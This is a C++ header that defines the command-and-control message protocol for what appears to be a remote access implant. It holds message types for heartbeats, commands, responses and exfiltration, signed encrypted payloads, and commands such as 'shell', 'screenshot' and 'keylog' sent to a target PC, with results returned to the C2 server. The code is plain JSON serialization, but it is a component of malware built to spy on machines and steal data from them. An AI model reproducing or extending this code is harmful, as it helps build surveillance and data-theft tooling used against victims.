#pragma once

#include <string>
#include <vector>
#include <cstdint>
#include <nlohmann/json.hpp>

namespace nuub::domain {

// C2 Protocol message types
// Note: 'ERROR' is a Windows macro, so we use 'MSG_ERROR' instead
enum class C2MessageType {
    HEARTBEAT = 0x01,
    COMMAND   = 0x02,
    RESPONSE  = 0x03,
    STATUS    = 0x04,
    EXFIL     = 0x05,
    MSG_ERROR = 0xFF,
};

// Base C2 message structure
struct C2Message {
    C2MessageType type;
    std::string agent_id;      // PC identifier
    std::string session_id;    // Unique session ID (random per boot)
    uint64_t timestamp;        // Unix timestamp ms
    std::string payload;       // Encrypted JSON payload
    std::string hmac;          // HMAC-SHA256 signature (hex)

    // Serialize to JSON
    std::string to_json() const {
        nlohmann::json j;
        j["type"] = static_cast<int>(type);
        j["agent_id"] = agent_id;
        j["session_id"] = session_id;
        j["timestamp"] = timestamp;
        j["payload"] = payload;
        j["hmac"] = hmac;
        return j.dump();
    }

    // Deserialize from JSON
    static C2Message from_json(const std::string& json_str) {
        C2Message msg{};
        try {
            auto j = nlohmann::json::parse(json_str);
            msg.type = static_cast<C2MessageType>(j["type"].get<int>());
            msg.agent_id = j.value("agent_id", "");
            msg.session_id = j.value("session_id", "");
            msg.timestamp = j.value("timestamp", 0ULL);
            msg.payload = j.value("payload", "");
            msg.hmac = j.value("hmac", "");
        } catch (...) {}
        return msg;
    }
};

// Command payload (sent inside C2Message.payload after decryption)
struct C2Command {
    std::string command;       // e.g., "shell", "screenshot", "keylog"
    std::string target;        // PC target
    std::string args;          // Additional arguments
    int duration = 0;          // For timed operations

    std::string to_json() const {
        nlohmann::json j;
        j["cmd"] = command;
        j["target"] = target;
        j["args"] = args;
        j["duration"] = duration;
        return j.dump();
    }

    static C2Command from_json(const std::string& json_str) {
        C2Command cmd;
        try {
            auto j = nlohmann::json::parse(json_str);
            cmd.command = j.value("cmd", "");
            cmd.target = j.value("target", "");
            cmd.args = j.value("args", "");
            cmd.duration = j.value("duration", 0);
        } catch (...) {}
        return cmd;
    }
};

// Response payload (sent back to C2 server)
struct C2Response {
    std::string command;       // Original command
    std::string status;        // "ok", "error", "partial"
    std::string data;          // Response data (text, base64 for binary)
    std::string error;         // Error message if status != "ok"

    std::string to_json() const {
        nlohmann::json j;
        j["cmd"] = command;
        j["status"] = status;
        j["data"] = data;
        if (!error.empty()) j["error"] = error;
        return j.dump();
    }

    static C2Response from_json(const std::string& json_str) {
        C2Response resp;
        try {
            auto j = nlohmann::json::parse(json_str);
            resp.command = j.value("cmd", "");
            resp.status = j.value("status", "ok");
            resp.data = j.value("data", "");
            resp.error = j.value("error", "");
        } catch (...) {}
        return resp;
    }
};

} // namespace nuub::domain
